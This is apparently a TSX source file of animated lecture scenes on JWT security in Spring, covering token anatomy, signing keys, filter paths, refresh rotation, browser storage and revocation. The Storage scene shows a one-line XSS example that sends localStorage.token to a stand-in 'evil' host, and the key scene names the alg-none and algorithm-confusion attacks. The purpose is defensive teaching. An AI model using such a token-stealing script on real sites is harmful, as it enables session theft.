// Spring Part 23 scenes (JWT): a token verified by every instance alone, the
// three parts splitting apart, shared secret vs public keys, the resource
// server filter path, refresh with rotation, where tokens live, revocation.
// Widths only, never heights; the top-right corner stays free for the term card.
import { C, MONO } from "../lib/theme.ts";
import { ease, enter, lerp, pop, rise } from "../lib/anim.ts";
import { Abs, card, Chip } from "./ui.tsx";
import { at, Big, clamp01 } from "./custom3.tsx";
import { Actor, Arrow, type CP, Packet, Svg } from "./secui.tsx";

// ------------------------------------------------------------------ hook: twenty instances, no lookups

export const Twenty = ({ t }: CP) => {
  const f = t.frame;
  const n = 10;
  return (
    <>
      <Actor x={300} y={420} w={300} icon="🧑" name="asha" sub="logged in once" color={C.blue} style={rise(f, 4)} />
      {Array.from({ length: n }, (_, i) => {
        const ok = f > 40 + i * 6;
        return (
          <Abs key={i} x={800 + (i % 5) * 200} y={320 + Math.floor(i / 5) * 200} w={170} style={{ ...card(ok ? C.green : C.line), padding: "14px 0", textAlign: "center", fontSize: 22, opacity: Math.min(1, pop(f, 10 + i * 4)) }}>
            🖥️ instance {i + 1}
            <div style={{ color: ok ? C.green : C.muted, fontSize: 20 }}>{ok ? "verified ✓" : "…"}</div>
          </Abs>
        );
      })}
      <Svg>
        <Arrow x1={460} y1={480} x2={780} y2={480} p={ease(f, 20, 20)} color={C.blue} />
      </Svg>
      <Abs x={470} y={430} w={300} style={{ fontFamily: MONO, fontSize: 20, color: C.blue, opacity: enter(f, 20) }}>Bearer eyJ…</Abs>
      {t.step >= 1 && (
        <Abs x={160} y={780} w={1600} style={{ textAlign: "center", ...rise(f, at(t, 1)) }}>
          <Big size={40}>no database lookup, no session store: the token proves itself</Big>
        </Abs>
      )}
    </>
  );
};

// ------------------------------------------------------------------ the three parts

export const Anatomy = ({ t }: CP) => {
  const f = t.frame;
  const split = ease(f, 20, 30);
  const parts = [
    { name: "header", col: C.pink, enc: "eyJhbGciOiJSUzI1NiJ9", lines: ['"alg": "RS256"', '"kid": "k1"', '"typ": "JWT"'], step: 1 },
    { name: "payload", col: C.purple, enc: "eyJzdWIiOiJhc2hh…", lines: ['"iss": "https://auth.example"', '"sub": "asha"', '"aud": "orders-api"', '"exp": 1767225600', '"jti": "7f3a…"', '"roles": ["USER"]'], step: 2 },
    { name: "signature", col: C.cyan, enc: "Q2xHk9_rT…", lines: ["RS256(header.payload,", "  private key)"], step: 3 },
  ];
  const tampered = t.step >= 3 && f > at(t, 3) + 60;
  return (
    <>
      <Abs x={160} y={260} w={1600} style={{ fontFamily: MONO, fontSize: 30, display: "flex", gap: lerp(0, 40, split), ...rise(f, 4) }}>
        {parts.map((p, i) => (
          <span key={p.name} style={{ color: p.col }}>
            {p.enc}
            {i < 2 && <span style={{ color: C.text }}>.</span>}
          </span>
        ))}
      </Abs>
      {parts.map((p, i) =>
        t.step >= p.step ? (
          <Abs key={p.name} x={160 + i * 540} y={360} w={500} style={{ ...card(tampered && i === 1 ? C.red : p.col), padding: "16px 20px", ...rise(f, at(t, p.step)) }}>
            <div style={{ fontSize: 26, fontWeight: 800, color: p.col }}>{p.name}</div>
            {p.lines.map((l) => (
              <div key={l} style={{ fontFamily: MONO, fontSize: 22, marginTop: 6 }}>
                {tampered && l.includes("roles") ? <span style={{ color: C.red }}>"roles": ["ADMIN"]</span> : l}
              </div>
            ))}
          </Abs>
        ) : null,
      )}
      {tampered && (
        <Abs x={160} y={720} w={1600} style={{ fontSize: 30, fontWeight: 800, color: C.red, ...rise(f, at(t, 3) + 60) }}>
          change USER to ADMIN → the signature no longer matches → rejected
        </Abs>
      )}
      {t.step >= 4 && (
        <Abs x={160} y={800} w={1600} style={{ ...rise(f, at(t, 4)) }}>
          <Chip color={C.amber} style={{ fontSize: 26 }}>signed, not encrypted: anyone can Base64-decode the payload. no secrets in it.</Chip>
        </Abs>
      )}
    </>
  );
};

// ------------------------------------------------------------------ shared secret vs public keys

export const Keys = ({ t }: CP) => {
  const f = t.frame;
  const svcs = ["orders", "billing", "search"];
  return (
    <>
      {t.step < 1 && (
        <div>
          <Abs x={160} y={260} w={1600} style={{ fontSize: 30, fontWeight: 800, color: C.amber, ...rise(f, 4) }}>HS256: one shared secret</Abs>
          {svcs.map((s, i) => (
            <Abs key={s} x={160 + i * 420} y={340} w={380} style={{ ...card(C.amber), padding: "16px 0", textAlign: "center", fontSize: 26, opacity: Math.min(1, pop(f, 14 + i * 8)) }}>
              🖥️ {s}
              <div style={{ fontSize: 22, color: C.amber }}>🔑 secret: can verify AND mint</div>
            </Abs>
          ))}
          <Abs x={160} y={520} w={1600} style={{ fontSize: 28, color: C.red, ...rise(f, 50) }}>leak the secret from any one service, and anyone can mint tokens</Abs>
        </div>
      )}
      {t.step >= 1 && (
        <>
          <Actor x={360} y={270} w={420} icon="🏛️" name="auth server" sub="🔐 private key: only it can sign" color={C.purple} style={rise(f, at(t, 1))} />
          <Abs x={760} y={290} w={420} style={{ ...card(C.cyan), padding: "14px 18px", textAlign: "center", fontFamily: MONO, fontSize: 22, ...rise(f, at(t, 1) + 20) }}>
            /.well-known/jwks.json
            <div style={{ fontFamily: "inherit", fontSize: 20, color: C.muted }}>public keys, by kid</div>
          </Abs>
          {svcs.map((s, i) => (
            <Abs key={s} x={1260} y={260 + i * 110} w={500} style={{ ...card(C.green), padding: "12px 18px", fontSize: 24, opacity: Math.min(1, pop(f, at(t, 1) + 40 + i * 8)) }}>
              🖥️ {s}: 🗝️ public key, verify only
            </Abs>
          ))}
        </>
      )}
      {t.step >= 2 && (
        <Abs x={160} y={620} w={1600} style={{ display: "flex", gap: 14, flexWrap: "wrap", ...rise(f, at(t, 2)) }}>
          {["1. signature, algorithm pinned", "2. exp / nbf (+60 s skew)", "3. iss: our auth server", "4. aud: meant for this API"].map((c, i) => (
            <Chip key={c} color={C.green} style={{ fontSize: 24, opacity: enter(f, at(t, 2) + i * 14) }}>{c}</Chip>
          ))}
        </Abs>
      )}
      {t.step >= 3 && (
        <Abs x={160} y={720} w={1600} style={{ ...card(C.red), padding: "14px 20px", ...rise(f, at(t, 3)) }}>
          <div style={{ fontFamily: MONO, fontSize: 24 }}>{'{ "alg": "none" }'} · unsigned token → a careless library accepts it</div>
        </Abs>
      )}
      {t.step >= 4 && (
        <Abs x={160} y={810} w={1600} style={{ ...card(C.red), padding: "14px 20px", ...rise(f, at(t, 4)) }}>
          <div style={{ fontSize: 24 }}>algorithm confusion: expects RS256, gets HS256 signed with the public key as the secret → pin the algorithm</div>
        </Abs>
      )}
    </>
  );
};

// ------------------------------------------------------------------ the resource server path

export const JwtPath = ({ t }: CP) => {
  const f = t.frame;
  const nodes = [
    { n: "BearerTokenAuthenticationFilter", s: "reads Authorization: Bearer", col: C.green, x: 160, y: 270, step: 0 },
    { n: "JwtDecoder", s: "signature · exp · iss (cached JWKS)", col: C.purple, x: 700, y: 270, step: 1 },
    { n: "JwtAuthenticationConverter", s: "scope → SCOPE_orders:read", col: C.green, x: 700, y: 430, step: 2 },
    { n: "SecurityContextHolder", s: "JwtAuthenticationToken", col: C.cyan, x: 700, y: 590, step: 2 },
    { n: "AuthorizationFilter", s: "URL rules", col: C.purple, x: 700, y: 750, step: 3 },
  ];
  return (
    <>
      {nodes.map((n) => (
        <Abs key={n.n} x={n.x} y={n.y} w={500} style={{ ...card(t.step >= n.step ? n.col : C.line), padding: "14px 18px", textAlign: "center", opacity: t.step >= n.step ? Math.min(1, pop(f, at(t, n.step) + 10)) : 0.3 }}>
          <div style={{ fontSize: 24, fontWeight: 800 }}>{n.n}</div>
          <div style={{ fontSize: 19, color: C.muted, fontFamily: MONO }}>{n.s}</div>
        </Abs>
      ))}
      <Svg>
        <Arrow x1={660} y1={315} x2={696} y2={315} p={t.step >= 1 ? 1 : 0} />
        {t.step >= 2 && <Arrow x1={950} y1={370} x2={950} y2={426} />}
        {t.step >= 2 && <Arrow x1={950} y1={530} x2={950} y2={586} />}
        {t.step >= 3 && <Arrow x1={950} y1={690} x2={950} y2={746} />}
        {t.step >= 4 && <Arrow x1={1200} y1={315} x2={1390} y2={315} color={C.red} />}
        {t.step >= 4 && <Arrow x1={1200} y1={795} x2={1390} y2={795} color={C.amber} />}
      </Svg>
      {t.step >= 4 && (
        <>
          <Abs x={1400} y={270} w={360} style={{ ...card(C.red), padding: "12px 16px", textAlign: "center", ...rise(f, at(t, 4)) }}>
            <div style={{ fontFamily: MONO, fontSize: 36, fontWeight: 800, color: C.red }}>401</div>
            <div style={{ fontSize: 18, fontFamily: MONO, color: C.muted }}>error="invalid_token"</div>
          </Abs>
          <Abs x={1400} y={750} w={360} style={{ ...card(C.amber), padding: "12px 16px", textAlign: "center", ...rise(f, at(t, 4) + 30) }}>
            <div style={{ fontFamily: MONO, fontSize: 36, fontWeight: 800, color: C.amber }}>403</div>
            <div style={{ fontSize: 18, color: C.muted }}>valid token, wrong role</div>
          </Abs>
        </>
      )}
      <Abs x={160} y={430} w={460} style={{ fontSize: 22, color: C.muted, ...rise(f, 30) }}>
        no header? continues as anonymous; a protected URL then gets 401
      </Abs>
    </>
  );
};

// ------------------------------------------------------------------ refresh with rotation and reuse detection

export const Refresh = ({ t }: CP) => {
  const f = t.frame;
  const life = (s: number) => clamp01((f - s) / 90);
  return (
    <>
      <Abs x={160} y={260} w={1600} style={{ display: "flex", gap: 30, ...rise(f, 4) }}>
        <div style={{ ...card(C.blue), padding: "14px 20px", flex: 1 }}>
          <div style={{ fontSize: 26, fontWeight: 800 }}>access token</div>
          <div style={{ fontSize: 22, color: C.muted }}>JWT · 15 minutes · every API call</div>
          <div style={{ height: 14, borderRadius: 7, background: C.card2, marginTop: 10 }}>
            <div style={{ height: 14, borderRadius: 7, width: `${(1 - life(20)) * 100}%`, background: C.blue }} />
          </div>
        </div>
        <div style={{ ...card(C.purple), padding: "14px 20px", flex: 1 }}>
          <div style={{ fontSize: 26, fontWeight: 800 }}>refresh token</div>
          <div style={{ fontSize: 22, color: C.muted }}>opaque · 7 days · server-side · only to /auth/refresh</div>
        </div>
      </Abs>
      {t.step >= 1 && (
        <>
          <Actor x={360} y={440} w={300} icon="📱" name="app" color={C.blue} style={rise(f, at(t, 1))} />
          <Actor x={1500} y={440} w={340} icon="🏛️" name="auth server" color={C.purple} style={rise(f, at(t, 1))} />
          <Packet f={f} start={at(t, 1) + 10} x1={360} x2={1500} y={600} label="POST /auth/refresh · R1" color={C.purple} w={440} />
          <Packet f={f} start={at(t, 1) + 50} x1={1500} x2={360} y={680} label="new access + R2 (R1 now dead)" color={C.green} w={480} />
        </>
      )}
      {t.step >= 2 && (
        <Abs x={160} y={780} w={1600} style={{ fontSize: 26, ...rise(f, at(t, 2)) }}>
          rotation: every refresh returns a new refresh token, and the old one stops working
        </Abs>
      )}
      {t.step >= 3 && (
        <>
          <Actor x={960} y={440} w={280} icon="🦹" name="attacker" sub="copied R1" color={C.red} style={rise(f, at(t, 3))} />
          <Abs x={160} y={850} w={1600} style={{ fontSize: 26, fontWeight: 800, color: C.red, ...rise(f, at(t, 3) + 30) }}>
            R1 used again → reuse detected → revoke the whole family, force login
          </Abs>
        </>
      )}
    </>
  );
};

// ------------------------------------------------------------------ where tokens live in the browser

export const Storage = ({ t }: CP) => {
  const f = t.frame;
  const spots = [
    { n: "localStorage", s: "any script can read it", col: C.red, step: 0, icon: "📦" },
    { n: "memory (a variable)", s: "lost on reload", col: C.amber, step: 1, icon: "🧠" },
    { n: "HttpOnly cookie", s: "script can't read · auto-sent → SameSite", col: C.green, step: 2, icon: "🍪" },
  ];
  return (
    <>
      {spots.map((s, i) =>
        t.step >= s.step ? (
          <Abs key={s.n} x={160 + i * 540} y={280} w={500} style={{ ...card(s.col), padding: "20px 22px", textAlign: "center", ...rise(f, at(t, s.step)) }}>
            <div style={{ fontSize: 56 }}>{s.icon}</div>
            <div style={{ fontSize: 28, fontWeight: 800 }}>{s.n}</div>
            <div style={{ fontSize: 22, color: C.muted, marginTop: 6 }}>{s.s}</div>
          </Abs>
        ) : null,
      )}
      {t.step === 0 && (
        <Abs x={160} y={560} w={1600} style={{ fontFamily: MONO, fontSize: 24, color: C.red, ...rise(f, 40) }}>
          {"<script>"} fetch('https://evil…?t=' + localStorage.token) {"</script>"}
        </Abs>
      )}
      {t.step >= 3 && (
        <Abs x={160} y={560} w={1600} style={{ ...card(C.blue), padding: "18px 24px", ...rise(f, at(t, 3)) }}>
          <div style={{ fontSize: 28, fontWeight: 800 }}>a common answer</div>
          <div style={{ fontSize: 24, marginTop: 8 }}>access token in memory · refresh token in an HttpOnly, Secure, SameSite=Strict cookie on /auth/refresh</div>
          <div style={{ fontSize: 22, color: C.muted, marginTop: 6 }}>after a reload, call refresh to get a new access token</div>
        </Abs>
      )}
    </>
  );
};

// ------------------------------------------------------------------ revoking before expiry

export const Revoke = ({ t }: CP) => {
  const f = t.frame;
  const opts = [
    ["⏱️", "short expiry: 5–15 min", "caps the damage · no state", C.green],
    ["🚫", "jti denylist in Redis, TTL = time left", "instant · a lookup per request", C.amber],
    ["🔢", "token version per user", "log out everywhere · one cached lookup", C.blue],
    ["♻️", "revoke the refresh token", "dies within one access lifetime", C.purple],
  ] as const;
  return (
    <>
      {t.step === 0 && (
        <Abs x={160} y={300} w={1600} style={{ ...rise(f, 4) }}>
          <Big size={44}>an admin bans asha. her JWT is still valid for 12 more minutes.</Big>
          <div style={{ fontSize: 30, color: C.muted, marginTop: 16 }}>and no service checks anywhere: that was the point</div>
        </Abs>
      )}
      {t.step >= 1 &&
        opts.map(([icon, n, s, col], i) =>
          t.step >= Math.min(i + 1, 3) ? (
            <Abs key={n} x={160} y={270 + i * 120} w={1600} style={{ ...card(col), padding: "14px 22px", display: "flex", gap: 20, alignItems: "center", ...rise(f, at(t, Math.min(i + 1, 3)) + (i === 3 ? 30 : 0)) }}>
              <span style={{ fontSize: 40 }}>{icon}</span>
              <span style={{ fontSize: 28, fontWeight: 800, flex: 1 }}>{n}</span>
              <span style={{ fontSize: 22, color: C.muted }}>{s}</span>
            </Abs>
          ) : null,
        )}
      {t.step >= 4 && (
        <Abs x={160} y={780} w={1600} style={{ textAlign: "center", ...rise(f, at(t, 4)) }}>
          <Big size={36} color={C.amber}>every revocation brings back some server-side state. that trade-off is the answer.</Big>
        </Abs>
      )}
    </>
  );
};
